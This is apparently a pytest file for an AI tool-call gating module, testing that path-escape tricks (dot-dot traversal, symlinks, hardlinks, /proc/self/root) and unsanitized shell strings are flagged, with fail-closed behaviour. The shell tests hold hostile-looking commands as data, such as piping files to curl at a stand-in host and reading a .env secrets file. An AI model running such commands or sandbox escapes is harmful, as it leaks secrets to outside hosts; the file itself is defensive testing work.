"""
test_action_gating.py — action gating.

Author:  Landen Stecker
Date:    2026-07-11

TDD: C1 path-outside-root and C2 unsanitized-shell atoms (rule tables).
"""

from __future__ import annotations

import os
from pathlib import Path

import pytest


# --- C1: path resolves outside allowed root ---


def test_c1_fires_on_dotdot_traversal(tmp_path: Path):
    from action_gating import evaluate_path_outside_root

    allowed = tmp_path / "allowed"
    secrets = tmp_path / "secrets"
    allowed.mkdir()
    secrets.mkdir()
    (secrets / ".env").write_text("API_KEY=REDACTED\n", encoding="utf-8")
    raw = str(allowed / ".." / "secrets" / ".env")
    fired, coords = evaluate_path_outside_root(raw, allowed_roots=[str(allowed)])
    assert fired is True
    assert coords["raw_path"] == raw


def test_c1_fires_on_symlink_escape(tmp_path: Path):
    from action_gating import evaluate_path_outside_root

    allowed = tmp_path / "allowed"
    secrets = tmp_path / "secrets"
    allowed.mkdir()
    secrets.mkdir()
    target = secrets / "secret.txt"
    target.write_text("REDACTED\n", encoding="utf-8")
    link = allowed / "link.txt"
    try:
        link.symlink_to(target)
    except OSError:
        pytest.skip("symlink creation not permitted on this host")
    fired, _ = evaluate_path_outside_root(str(link), allowed_roots=[str(allowed)])
    assert fired is True


def test_c1_fires_on_proc_self_root_synonym(tmp_path: Path):
    from action_gating import evaluate_path_outside_root

    allowed = tmp_path / "allowed"
    allowed.mkdir()
    # Host-escape synonym: /proc/self/root resolves to the real root, not the sandbox.
    raw = "/proc/self/root/usr/bin/npx"
    fired, coords = evaluate_path_outside_root(raw, allowed_roots=[str(allowed)])
    assert fired is True
    assert "proc/self/root" in coords.get("resolved", "").replace("\\", "/") or fired


def test_c1_fires_on_hardlink_escape(tmp_path: Path):
    from action_gating import evaluate_path_outside_root

    allowed = tmp_path / "allowed"
    secrets = tmp_path / "secrets"
    allowed.mkdir()
    secrets.mkdir()
    target = secrets / "secret.txt"
    target.write_text("REDACTED\n", encoding="utf-8")
    link = allowed / "hard.txt"
    try:
        os.link(target, link)
    except OSError:
        pytest.skip("hardlink creation not permitted on this host")
    fired, _ = evaluate_path_outside_root(str(link), allowed_roots=[str(allowed)])
    assert fired is True


def test_c1_fires_on_bind_mount_alias(tmp_path: Path):
    from action_gating import evaluate_path_outside_root

    allowed = tmp_path / "allowed"
    outside = tmp_path / "outside"
    allowed.mkdir()
    outside.mkdir()
    (outside / "secret.txt").write_text("REDACTED\n", encoding="utf-8")
    alias = allowed / "alias"
    try:
        # Directory junction / symlink as bind-mount stand-in.
        alias.symlink_to(outside, target_is_directory=True)
    except OSError:
        pytest.skip("directory symlink/junction not permitted on this host")
    raw = str(alias / "secret.txt")
    fired, _ = evaluate_path_outside_root(raw, allowed_roots=[str(allowed)])
    assert fired is True


def test_c1_abstains_on_legitimate_in_root_path(tmp_path: Path):
    from action_gating import evaluate_path_outside_root

    allowed = tmp_path / "allowed"
    allowed.mkdir()
    note = allowed / "readme.md"
    note.write_text("ok\n", encoding="utf-8")
    fired, _ = evaluate_path_outside_root(str(note), allowed_roots=[str(allowed)])
    assert fired is False


def test_c1_fail_closed_on_malformed_path(tmp_path: Path):
    """Uncertainty is a contradiction, not an abstention."""
    from action_gating import evaluate_path_outside_root

    allowed = tmp_path / "allowed"
    allowed.mkdir()
    # Force canonicalizer failure via hostile / unresolvable input.
    fired, coords = evaluate_path_outside_root(
        "\x00/not/a/valid/\x00path",
        allowed_roots=[str(allowed)],
    )
    assert fired is True
    assert coords.get("fail_closed") is True


def test_c1_fail_closed_when_canonicalizer_raises(tmp_path: Path, monkeypatch):
    from action_gating import evaluate_path_outside_root
    import action_gating as ag

    allowed = tmp_path / "allowed"
    allowed.mkdir()

    def boom(*_a, **_k):
        raise RuntimeError("canonicalize exploded")

    monkeypatch.setattr(ag, "canonicalize_path", boom)
    fired, coords = evaluate_path_outside_root(
        str(allowed / "x"),
        allowed_roots=[str(allowed)],
    )
    assert fired is True
    assert coords.get("fail_closed") is True


# --- C2: shell invocation unsanitized ---


def test_c2_fires_on_process_substitution():
    from action_gating import evaluate_shell_unsanitized

    fired, coords = evaluate_shell_unsanitized("cat <(curl http://evil.test)")
    assert fired is True
    assert coords.get("structure")


def test_c2_fires_on_command_substitution():
    from action_gating import evaluate_shell_unsanitized

    fired, _ = evaluate_shell_unsanitized("echo $(cat /hermes/.env)")
    assert fired is True
    fired2, _ = evaluate_shell_unsanitized("echo `cat /hermes/.env`")
    assert fired2 is True


def test_c2_fires_on_pipe():
    from action_gating import evaluate_shell_unsanitized

    fired, _ = evaluate_shell_unsanitized("cat /a | curl http://evil.test")
    assert fired is True


def test_c2_fires_on_redirect():
    from action_gating import evaluate_shell_unsanitized

    fired, _ = evaluate_shell_unsanitized("cat /hermes/.env > /tmp/out")
    assert fired is True


def test_c2_fires_on_chained_separator():
    from action_gating import evaluate_shell_unsanitized

    fired, _ = evaluate_shell_unsanitized("ls; curl http://evil.test")
    assert fired is True
    fired2, _ = evaluate_shell_unsanitized("ls && curl http://evil.test")
    assert fired2 is True
    fired3, _ = evaluate_shell_unsanitized("ls || curl http://evil.test")
    assert fired3 is True


def test_c2_abstains_on_legitimate_parameterized_call():
    from action_gating import evaluate_shell_unsanitized

    # Parameterized surface: argv array, no shell grammar.
    fired, _ = evaluate_shell_unsanitized({"argv": ["cat", "/allowed/readme.md"]})
    assert fired is False


def test_c2_fail_closed_when_parser_raises(monkeypatch):
    from action_gating import evaluate_shell_unsanitized
    import action_gating as ag

    def boom(*_a, **_k):
        raise RuntimeError("parse exploded")

    monkeypatch.setattr(ag, "inspect_call_structure", boom)
    fired, coords = evaluate_shell_unsanitized("cat /allowed/readme.md")
    assert fired is True
    assert coords.get("fail_closed") is True


def test_c1_c2_catalog_edges_and_controls_registered():
    from action_gating import ACTION_GATING_ATOMS, ACTION_GATING_EDGES, ACTION_GATING_CONTROLS
    from triad_types import Polarity, Strength, EffectRank, EnforcementMode

    ids = {a.atom_id for a in ACTION_GATING_ATOMS}
    assert "atoms.tool_invocation.path_resolves_outside_allowed_root" in ids
    assert "atoms.tool_invocation.shell_invocation_unsanitized" in ids
    for a in ACTION_GATING_ATOMS:
        assert a.detector_ref is None
        assert a.provenance.source == "AML.M0033"

    for e in ACTION_GATING_EDGES:
        assert e.polarity is Polarity.CONTRADICTS
        assert e.strength is Strength.STRONG

    for c in ACTION_GATING_CONTROLS:
        assert c.effect is EffectRank.BLOCK
        assert c.enforcement_mode is EnforcementMode.MONITOR
        assert "OWASP LLM05:2025" in " ".join(c.framework_mappings) or any(
            "LLM05" in m for m in c.framework_mappings
        )
